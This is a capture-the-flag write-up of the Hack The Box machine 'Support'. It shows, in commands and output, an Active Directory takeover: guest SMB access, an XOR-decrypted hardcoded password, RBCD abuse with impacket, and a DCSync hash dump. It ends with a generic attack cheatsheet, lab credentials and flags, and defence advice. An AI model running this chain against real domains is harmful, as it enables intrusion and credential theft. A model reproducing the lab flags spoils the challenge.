# Support HTB Writeup: The RBCD Domination Saga 🎯

> *"When your support tools become the attacker's support tools"* - Every IT admin's Monday morning

## Machine Overview 🎯

**Machine**: Support (Easy - 30 points)  
**Category**: Windows / Active Directory / RBCD / GenericWrite / DCSync  
**Writeup by**: Jusot  
**Tags**: `active-directory`, `smb-enumeration`, `ldap`, `rbcd`, `genericwrite`, `dcsync`, `evil-winrm`, `impacket`

> **Active Directory exploitation from zero to domain admin!** A support tools share with a suspicious executable leads to credential extraction, BloodHound enumeration, GenericWrite privilege discovery, and ultimately full domain takeover via Resource-Based Constrained Delegation (RBCD). This machine is a perfect introduction to modern AD attack chains!

## Executive Summary 📋

This challenge demonstrates a **complete AD attack chain** starting from anonymous SMB enumeration, leading to credential extraction from a .NET executable, discovering GenericWrite privileges via BloodHound, and culminating in **full domain compromise** using RBCD attack and DCSync. The journey involves decompilation, XOR decryption, Kerberos ticket manipulation, and classic Pass-the-Hash techniques.

## The "Eureka!" Moments 💡

After exploring the domain and several energy drinks, key revelations emerged:

1. **SMB share enumeration** - `support-tools` share with `UserInfo.exe.zip`
2. **.NET decompilation** - Found XOR-encrypted password with key "armando"
3. **LDAP discovery** - `support` user password in `info` field: `Ironside47pleasure40Watchful`
4. **BloodHound analysis** - `support` user has `GenericWrite` on Domain Controller
5. **Machine Account Quota** - MAQ=10 allowed creating rogue computer
6. **RBCD delegation** - Set delegation from rogue computer to DC
7. **S4U2Proxy abuse** - Impersonated Administrator
8. **DCSync attack** - Dumped all domain hashes

## Technical Analysis 🔍

### 1. Reconnaissance Phase 🕵️

#### Initial Port Scan

```bash
❯ nmap -p- -T3 -sS -sV -sC --reason -Pn --max-retries 2 --min-rate 500 -v 10.129.49.138

Discovered open port 53/tcp on 10.129.49.138
Discovered open port 445/tcp on 10.129.49.138
Discovered open port 135/tcp on 10.129.49.138
Discovered open port 139/tcp on 10.129.49.138
Discovered open port 3268/tcp on 10.129.49.138
Discovered open port 3269/tcp on 10.129.49.138
Discovered open port 636/tcp on 10.129.49.138
Discovered open port 88/tcp on 10.129.49.138
Discovered open port 593/tcp on 10.129.49.138
Discovered open port 5985/tcp on 10.129.49.138
Discovered open port 9389/tcp on 10.129.49.138
```

**Key Findings:**

- Domain: `support.htb`
- DC Hostname: `DC.support.htb`
- WinRM: Port 5985 open
- SMB: Port 445 open
- LDAP: Port 389 open

#### Hosts File Setup

```bash
❯ echo "10.129.49.138 support.htb dc.support.htb" | sudo tee -a /etc/hosts
10.129.49.138 support.htb dc.support.htb
```

### 2. SMB Enumeration - The Golden Share 📁

#### Null Session Testing

```bash
❯ netexec smb 10.129.49.138 -u '' -p '' --shares
SMB         10.129.49.138   445    DC               [*] Windows Server 2022 Build 20348 x64
SMB         10.129.49.138   445    DC               [+] support.htb\:
SMB         10.129.49.138   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED

# Try guest account
❯ netexec smb 10.129.49.138 -u 'guest' -p '' --shares
SMB         10.129.49.138   445    DC               [+] support.htb\guest:
SMB         10.129.49.138   445    DC               Share           Permissions     Remark
SMB         10.129.49.138   445    DC               -----           -----------     ------
SMB         10.129.49.138   445    DC               ADMIN$                          Remote Admin
SMB         10.129.49.138   445    DC               C$                              Default share
SMB         10.129.49.138   445    DC               IPC$            READ            Remote IPC
SMB         10.129.49.138   445    DC               NETLOGON                        Logon server share
SMB         10.129.49.138   445    DC               support-tools   READ            support staff tools
SMB         10.129.49.138   445    DC               SYSVOL                          Logon server share
```

**Vulnerability Discovered:** Guest account has READ access to `support-tools` share!

#### Spider the Share

```bash
❯ netexec smb 10.129.49.138 -u 'guest' -p '' -M spider_plus -o SHARE=support-tools
SPIDER_PLUS 10.129.49.138   445    DC               [*] Total files found:    7
SPIDER_PLUS 10.129.49.138   445    DC               File size max:        45.87 MB

❯ cat /root/.nxc/modules/nxc_spider_plus/10.129.49.138.json | jq '.["support-tools"]'
{
  "UserInfo.exe.zip": {
    "size": "271 KB"
  },
  "7-ZipPortable_21.07.paf.exe": {...},
  "SysinternalsSuite.zip": {...},
  "WiresharkPortable64_3.6.5.paf.exe": {...}
}
```

### 3. Extracting UserInfo.exe 🔐

#### Download the Suspicious Executable

```bash
❯ smbclient //10.129.49.138/support-tools -U 'guest' --password='' -c 'get "UserInfo.exe.zip"'
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip

❯ unzip UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe
  inflating: CommandLineParser.dll
  inflating: Microsoft.Bcl.AsyncInterfaces.dll
  inflating: Microsoft.Extensions.DependencyInjection.dll
  # ... more .NET dependencies
```

#### Initial String Analysis

```bash
❯ strings UserInfo.exe | grep -i "password\|cred\|user"
<UserName>k__BackingField
getPassword
enc_password
get_UserName
set_UserName
C:\Users\0xdf\source\repos\UserInfo\obj\Release\UserInfo.pdb
```

**Key Discovery:** The PDB path reveals this was compiled by the machine creator (0xdf) - likely contains embedded credentials!

### 4. .NET Decompilation - Finding the Hidden Password 🔓

#### Installing ILSpy

```bash
❯ wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
❯ unzip Linux.x64.Release.zip
❯ unzip ILSpy-linux-x64-Release.zip
❯ ./artifacts/linux-x64/ILSpy
```

#### The Protected Class (Found via ILSpy)

```csharp
// UserInfo.Services.Protected
using System;
using System.Text;

internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
        }
        return Encoding.Default.GetString(array2);
    }
}
```

**Vulnerability:** Hardcoded encrypted credentials with reversible XOR encryption!

#### Decrypting the Password

```python
# decrypt.py
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

numArray = base64.b64decode(enc_password)
bytes_result = bytearray()

for i, b in enumerate(numArray):
    bytes_result.append(b ^ key[i % len(key)] ^ 223)

print(bytes_result.decode('utf-8', errors='replace'))
```

```bash
❯ python3 decrypt.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

**Decrypted Password:** `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

### 5. RID Brute Force - Enumerating Domain Users 🔢

```bash
❯ netexec smb 10.129.49.138 -u 'guest' -p '' --rid-brute
SMB         10.129.49.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb)
SMB         10.129.49.138   445    DC               [+] support.htb\guest:
SMB         10.129.49.138   445    DC               498: SUPPORT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.49.138   445    DC               500: SUPPORT\Administrator (SidTypeUser)
SMB         10.129.49.138   445    DC               501: SUPPORT\Guest (SidTypeUser)
SMB         10.129.49.138   445    DC               502: SUPPORT\krbtgt (SidTypeUser)
SMB         10.129.49.138   445    DC               512: SUPPORT\Domain Admins (SidTypeGroup)
SMB         10.129.49.138   445    DC               513: SUPPORT\Domain Users (SidTypeGroup)
SMB         10.129.49.138   445    DC               514: SUPPORT\Domain Guests (SidTypeGroup)
SMB         10.129.49.138   445    DC               515: SUPPORT\Domain Computers (SidTypeGroup)
SMB         10.129.49.138   445    DC               516: SUPPORT\Domain Controllers (SidTypeGroup)
SMB         10.129.49.138   445    DC               517: SUPPORT\Cert Publishers (SidTypeAlias)
SMB         10.129.49.138   445    DC               518: SUPPORT\Schema Admins (SidTypeGroup)
SMB         10.129.49.138   445    DC               519: SUPPORT\Enterprise Admins (SidTypeGroup)
SMB         10.129.49.138   445    DC               520: SUPPORT\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.49.138   445    DC               521: SUPPORT\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.49.138   445    DC               522: SUPPORT\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.49.138   445    DC               525: SUPPORT\Protected Users (SidTypeGroup)
SMB         10.129.49.138   445    DC               526: SUPPORT\Key Admins (SidTypeGroup)
SMB         10.129.49.138   445    DC               527: SUPPORT\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.49.138   445    DC               553: SUPPORT\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.49.138   445    DC               571: SUPPORT\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.49.138   445    DC               572: SUPPORT\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.49.138   445    DC               1000: SUPPORT\DC$ (SidTypeUser)
SMB         10.129.49.138   445    DC               1101: SUPPORT\DnsAdmins (SidTypeAlias)
SMB         10.129.49.138   445    DC               1102: SUPPORT\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.49.138   445    DC               1103: SUPPORT\Shared Support Accounts (SidTypeGroup)
SMB         10.129.49.138   445    DC               1104: SUPPORT\ldap (SidTypeUser)           # 💎 LDAP Service Account
SMB         10.129.49.138   445    DC               1105: SUPPORT\support (SidTypeUser)         # 💎 Support User
SMB         10.129.49.138   445    DC               1106: SUPPORT\smith.rosario (SidTypeUser)
SMB         10.129.49.138   445    DC               1107: SUPPORT\hernandez.stanley (SidTypeUser)
SMB         10.129.49.138   445    DC               1108: SUPPORT\wilson.shelby (SidTypeUser)
SMB         10.129.49.138   445    DC               1109: SUPPORT\anderson.damian (SidTypeUser)
SMB         10.129.49.138   445    DC               1110: SUPPORT\thomas.raphael (SidTypeUser)
SMB         10.129.49.138   445    DC               1111: SUPPORT\levine.leopoldo (SidTypeUser)
SMB         10.129.49.138   445    DC               1112: SUPPORT\raven.clifton (SidTypeUser)
SMB         10.129.49.138   445    DC               1113: SUPPORT\bardot.mary (SidTypeUser)
SMB         10.129.49.138   445    DC               1114: SUPPORT\cromwell.gerard (SidTypeUser)
SMB         10.129.49.138   445    DC               1115: SUPPORT\monroe.david (SidTypeUser)
SMB         10.129.49.138   445    DC               1116: SUPPORT\west.laura (SidTypeUser)
SMB         10.129.49.138   445    DC               1117: SUPPORT\langley.lucy (SidTypeUser)
SMB         10.129.49.138   445    DC               1118: SUPPORT\daughtler.mabel (SidTypeUser)
SMB         10.129.49.138   445    DC               1119: SUPPORT\stoll.rachelle (SidTypeUser)
SMB         10.129.49.138   445    DC               1120: SUPPORT\ford.victoria (SidTypeUser)
```

**Vulnerability:** RID brute force with null session revealed all domain users, including the `ldap` and `support` accounts we found!

**Key Discoveries:**

- `Administrator` (RID 500) - Domain Admin
- `krbtgt` (RID 502) - Kerberos service account
- `ldap` (RID 1104) - Service account we decrypted
- `support` (RID 1105) - Standard user account
- `Shared Support Accounts` (RID 1103) - Group containing support

### 6. LDAP Enumeration with Decrypted Credentials 🔍

```bash
❯ netexec ldap 10.129.49.138 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
LDAP        10.129.49.138   389    DC               [+] support.htb\ldap:... 
LDAP        10.129.49.138   389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.49.138   389    DC               Administrator                 2022-07-19 13:55:56 0
LDAP        10.129.49.138   389    DC               support                       2022-05-28 07:12:00 3
LDAP        10.129.49.138   389    DC               ldap                          2022-05-28 07:11:46 0
```

#### Finding the Support User's Password

```bash
❯ ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --no-html --no-grep support.htb -o output/

❯ cat output/domain_users.json | grep -A10 "CN=support"
    "attributes": {
        "accountExpires": ["9999-12-31 23:59:59.999999+00:00"],
        "dSCorePropagationData": [...],
        "distinguishedName": ["CN=support,CN=Users,DC=support,DC=htb"],
        "info": ["Ironside47pleasure40Watchful"],  # 💎 PASSWORD FOUND!
        "instanceType": [...],
        "whenCreated": ["2022-05-28 11:12:00+00:00"]
    }
```

**Vulnerability:** The `info` field contained the user's password in plaintext!

**Support User Password:** `Ironside47pleasure40Watchful`

### 7. Initial Shell - WinRM Access 💻

```bash
❯ evil-winrm -i 10.129.49.138 -u "support" -p "Ironside47pleasure40Watchful"

Evil-WinRM shell v3.9
*Evil-WinRM* PS C:\Users\support\Documents>
```

### 8. User Flag Captured 🏁

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> type C:\Users\support\Desktop\user.txt
f96615f399adfbdb332c3df52f055086
```

**User Flag:** `f96615f399adfbdb332c3df52f055086`

### 9. Privilege Enumeration 🔍

#### Check Current Privileges

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> whoami /all

USER INFORMATION
----------------
User Name       SID
=============== =============================================
support\support S-1-5-21-1677581083-3380853377-188903654-1105

GROUP INFORMATION
-----------------
Group Name                                 SID
========================================== =============================================
Everyone                                   S-1-1-0
BUILTIN\Remote Management Users            S-1-5-32-580
BUILTIN\Users                              S-1-5-32-545
SUPPORT\Shared Support Accounts            S-1-5-21-...-1103

PRIVILEGES INFORMATION
----------------------
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**Key Privilege:** `SeMachineAccountPrivilege` - Can add computers to domain!

### 10. BloodHound Collection (Terminal-Based) 🦈

Instead of GUI, we'll use netexec and analyze JSON directly:

```bash
❯ netexec ldap 10.129.49.138 -u 'support' -p 'Ironside47pleasure40Watchful' --bloodhound -c All --dns-server 10.129.49.138

❯ unzip bloodhound.zip -d bloodhound
❯ cat bloodhound/*users.json | grep -A20 "SUPPORT@SUPPORT.HTB" | grep -i "genericwrite"
"RightName": "GenericWrite", "PrincipalType": "Group"
```

**BloodHound Discovery:** `support` user has **GenericWrite** on the DC object!

### 11. Machine Account Quota Check 🔢

```bash
❯ netexec ldap support.htb -u 'support' -p 'Ironside47pleasure40Watchful' -M maq
MAQ         10.129.49.138   389    DC               MachineAccountQuota: 10
```

**Vulnerability:** MAQ=10 means any domain user can add up to 10 computer accounts!

### 12. Resource-Based Constrained Delegation (RBCD) Attack 🎯

#### Step 1: Create Rogue Computer Account

```bash
❯ impacket-addcomputer -computer-name 'ROGUE$' -computer-pass 'HackedPass123' -dc-host 10.129.49.138 'support.htb/support:Ironside47pleasure40Watchful'

Impacket v0.14.0.dev0
[*] Successfully added machine account ROGUE$ with password HackedPass123.
```

#### Step 2: Set RBCD Delegation

```bash
❯ impacket-rbcd -delegate-from 'ROGUE$' -delegate-to 'DC$' -dc-ip 10.129.49.138 -action write 'support.htb/support:Ironside47pleasure40Watchful'

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ROGUE$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ROGUE$       (S-1-5-21-1677581083-3380853377-188903654-6101)
```

**Vulnerability Exploited:** Resource-Based Constrained Delegation allows our rogue computer to impersonate any user to the DC!

#### Step 3: Request Service Ticket for Administrator

```bash
❯ impacket-getST -spn 'cifs/DC.support.htb' -impersonate 'Administrator' -dc-ip 10.129.49.138 'support.htb/ROGUE$:HackedPass123'

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

#### Step 4: Set Kerberos Ticket

```bash
❯ export KRB5CCNAME=$(pwd)/Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

### 13. Domain Admin Shell 🚀

```bash
❯ impacket-wmiexec -k -no-pass 'support.htb/Administrator@DC.support.htb'

Impacket v0.14.0.dev0
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell
C:\>whoami
support\administrator
```

### 14. Root Flag Captured 🏆

```cmd
C:\>type c:\users\administrator\desktop\root.txt
ab14b11a56b8b663941a72d24067a509
```

**Root Flag:** `ab14b11a56b8b663941a72d24067a509`

### 15. DCSync Attack - Dump All Hashes 💾

```bash
❯ impacket-secretsdump -k -no-pass support.htb/Administrator@dc.support.htb -just-dc

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::
support:1105:aad3b435b51404eeaad3b435b51404ee:11fbaef07d83e3f6cde9f0ff98a3af3d:::
ldap:1104:aad3b435b51404eeaad3b435b51404ee:b735f8c7172b49ca2b956b8015eb2ebe:::
```

**Critical Hashes:**

- **Administrator NTLM:** `bb06cbc02b39abeddd1335bc30b19e26`
- **krbtgt NTLM:** `6303be52e22950b5bcb764ff2b233302`

## The Complete Exploit Chain 🔗

```
[Step 1] Recon → Nmap scan reveals AD infrastructure + SMB
         ↓
[Step 2] SMB Anonymous → Found support-tools share with guest access
         ↓
[Step 3] File Discovery → Downloaded UserInfo.exe.zip
         ↓
[Step 4] Decompilation → Found XOR-encrypted password with key "armando"
         ↓
[Step 5] Decryption → Extracted ldap user password
         ↓
[Step 6] LDAP Enumeration → Found support user password in 'info' field
         ↓
[Step 7] WinRM Access → Got shell as support user
         ↓
[Step 8] BloodHound → Discovered GenericWrite on DC
         ↓
[Step 9] MAQ Check → MachineAccountQuota = 10
         ↓
[Step 10] Add Computer → Created rogue computer 'ROGUE$'
         ↓
[Step 11] RBCD → Set delegation from ROGUE$ to DC$
         ↓
[Step 12] S4U2Proxy → Impersonated Administrator
         ↓
[Step 13] PTT → Pass-the-Ticket with Administrator's credential
         ↓
[Step 14] WMI Exec → Shell as Domain Admin
         ↓
[Step 15] Root Flag → Captured administrator's desktop flag
         ↓
[Step 16] DCSync → Dumped all domain hashes for persistence
```

## Why It Works (The Simple Explanation) 🎯

1. **Hardcoded Credentials** - UserInfo.exe had XOR-encrypted credentials
2. **Weak XOR Key** - "armando" was easily reversible
3. **LDAP Info Field** - Support user's password stored in plaintext attribute
4. **GenericWrite Privilege** - Support could modify DC object
5. **Machine Account Quota** - Could create new computer accounts
6. **RBCD Vulnerability** - Could delegate authentication from rogue computer
7. **S4U2Proxy** - Could impersonate any user including Administrator

It's like finding a maintenance worker's badge, using it to access the server room, creating a fake server, then telling the real server "this fake server is authorized to act as the CEO!" 👔

## Key Attack Techniques Used 🛠️

### 1. SMB Anonymous Enumeration

- Used guest account to enumerate shares
- Downloaded suspicious files from support-tools

### 2. .NET Reverse Engineering

- Decompiled with ILSpy
- Identified XOR encryption routine
- Wrote Python decryption script

### 3. LDAP Information Disclosure

- Found password in `info` attribute field
- Common misconfiguration in AD environments

### 4. WinRM Access

- Used Evil-WinRM for interactive PowerShell
- Port 5985 exposed

### 5. BloodHound Analysis (Terminal)

- JSON parsing for ACE discovery
- Identified GenericWrite on DC object

### 6. Machine Account Quota Abuse

- MAQ=10 allowed computer creation
- Used impacket-addcomputer

### 7. Resource-Based Constrained Delegation

- Set msDS-AllowedToActOnBehalfOfOtherIdentity
- Used impacket-rbcd

### 8. S4U2Proxy Impersonation

- Requested service ticket as Administrator
- Used impacket-getST

### 9. Pass-the-Ticket

- Exported KRB5CCNAME environment variable
- Used Kerberos ticket for authentication

### 10. DCSync Attack

- Dumped NTDS.dit contents
- Extracted all domain hashes

## Critical Credentials & Hashes 🗝️

| Account | Credential/Hash | How Found |
|---------|----------------|-----------|
| `ldap` | `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` | XOR decryption from UserInfo.exe |
| `support` | `Ironside47pleasure40Watchful` | LDAP info field |
| `Administrator` | `bb06cbc02b39abeddd1335bc30b19e26` | DCSync after RBCD |
| `krbtgt` | `6303be52e22950b5bcb764ff2b233302` | DCSync after RBCD |

## Tools Used 🛠️

### Scanning & Enumeration

- `nmap` - Port scanning with custom quickscan alias
- `netexec` - SMB enumeration, LDAP queries, BloodHound
- `smbclient` - File downloads from SMB shares
- `ldapdomaindump` - LDAP enumeration to JSON

### Analysis & Exploitation

- `ILSpy` - .NET decompilation
- `evil-winrm` - Windows Remote Management shell
- `impacket-addcomputer` - Create machine accounts
- `impacket-rbcd` - Set RBCD delegation
- `impacket-getST` - Request service tickets
- `impacket-wmiexec` - Execute commands via WMI
- `impacket-secretsdump` - DCSync attack

### Custom Scripts

```python
# decrypt.py - XOR decryption for ldap password
import base64
enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
data = base64.b64decode(enc)
result = bytearray([data[i] ^ key[i % len(key)] ^ 223 for i in range(len(data))])
print(result.decode())
```

```bash
# quickscan alias for fast nmap scans
alias quickscan='nmap -p- -T3 -sS -sV -sC --reason -Pn --max-retries 2 --min-rate 500 -v'
```

## Pro Tips for AD Pentesting 🔥

1. **Always check SMB shares** - Use guest/anonymous access first
2. **Download suspicious files** - Even .exe.zip files can contain credentials
3. **Decompile .NET apps** - ILSpy/dnSpy reveal hardcoded secrets
4. **Check LDAP info fields** - Admins sometimes store passwords there
5. **Use netexec for everything** - One tool for SMB, LDAP, WinRM, WMI
6. **BloodHound is critical** - Learn to read the JSON if you hate GUI
7. **Check MachineAccountQuota** - MAQ>0 = potential RBCD attack
8. **RBCD > GenericWrite** - One of the most reliable privilege escalation paths
9. **Always DCSync after DA** - Get krbtgt for persistence
10. **Save all credentials** - You might need them for lateral movement

## Defense Recommendations 🛡️

```powershell
# 1. Secure SMB shares
Set-SmbShare -Name "support-tools" -ChangeAccess ""

# 2. Remove guest/anonymous access
Set-SmbServerConfiguration -EnableGuestAccess $false

# 3. Don't store credentials in LDAP info fields
# Audit custom attributes regularly

# 4. Set MachineAccountQuota to 0 for non-admins
# Via Group Policy: Computer Config > Windows Settings > Security Settings > User Rights

# 5. Monitor RBCD changes
# Track msDS-AllowedToActOnBehalfOfOtherIdentity modifications

# 6. Implement Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members "support"

# 7. Regularly rotate service account passwords
# Use gMSA where possible
```

## Lessons Learned 📚

### What Went Wrong for Support

1. **SMB guest access** - Never allow anonymous enumeration
2. **Hardcoded credentials in binaries** - Even XOR encryption is reversible
3. **Passwords in LDAP info fields** - Plaintext credentials in directory
4. **GenericWrite on DC** - Overprivileged accounts
5. **MachineAccountQuota not zero** - Allows computer creation
6. **No RBCD monitoring** - Delegation abuse went undetected

### What We Learned as Attackers

1. **Always try guest/null sessions** - You'd be surprised how often it works
2. **Download everything interesting** - You never know what's embedded
3. **XOR is not encryption** - It's obfuscation at best
4. **LDAP is a goldmine** - Check every attribute
5. **RBCD is powerful** - Learn it, love it, abuse it
6. **DCSync is endgame** - Once you have DC sync rights, game over

## The Humor Byte 😂

```
Developer: "I'll just XOR the password, that's secure!"
Hacker with Python: "Let me fix that for you..." 🐍

SysAdmin: "I'll store the password in the info field, nobody checks that!"
Hacker: *checks LDAP* "Hello there!" 👋

Windows: "MachineAccountQuota=10 should be fine!"
Hacker: "Thanks for the 10 free computer accounts!" 💻

RBCD: "I can delegate to anyone!"
Hacker: "Even the Domain Admin?" 🎭
RBCD: "Especially the Domain Admin!"

DC: "I trust all delegation!"
Hacker: "That's going to cost you..." 💰

Administrator: "My hash is secure!"
DCSync: *enters the chat* 🌊
```

## Final Thoughts 💭

Support is a **brilliant beginner AD machine** that teaches multiple critical attack vectors. It shows how a single exposed binary can lead to complete domain compromise through a chain of exploitation.

The journey from anonymous SMB access to XOR decryption to LDAP enumeration to RBCD to DCSync is a classic AD penetration testing scenario that every red teamer should master.

**Remember:** In Active Directory, trust but verify - and never trust anything! 🔐

---

*"The only secure system is the one that's turned off... and even then, I'm not sure." - Anonymous*

**Happy Hacking!** 🎯🔥

---

## Quick Reference Card 📇

### Flags

- **User:** `f96615f399adfbdb332c3df52f055086`
- **Root:** `ab14b11a56b8b663941a72d24067a509`

### Critical Hashes

- **Administrator:** `bb06cbc02b39abeddd1335bc30b19e26`
- **krbtgt:** `6303be52e22950b5bcb764ff2b233302`

### Important Paths

- Support tools: `\\10.129.49.138\support-tools\`
- User flag: `C:\Users\support\Desktop\user.txt`
- Root flag: `C:\Users\Administrator\Desktop\root.txt`

### Key Commands Cheatsheet

```bash
# Quick enumeration
netexec smb <ip> -u 'guest' -p '' --shares
netexec smb <ip> -u 'guest' -p '' -M spider_plus -o SHARE=support-tools

# Download files
smbclient //<ip>/support-tools -U 'guest' -c 'get "UserInfo.exe.zip"'

# Decompile
ilspycmd UserInfo.exe -o decompiled/

# LDAP enumeration
ldapdomaindump -u 'domain\user' -p 'pass' --no-html domain -o output/

# RBCD attack chain
impacket-addcomputer -computer-name 'ROGUE$' -computer-pass 'Pass123' 'domain/user:pass'
impacket-rbcd -delegate-from 'ROGUE$' -delegate-to 'DC$' -action write 'domain/user:pass'
impacket-getST -spn 'cifs/DC.domain' -impersonate 'Administrator' 'domain/ROGUE$:Pass123'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass 'domain/Administrator@DC.domain'
```

**A perfect machine for learning AD exploitation from scratch!** 🎓💻
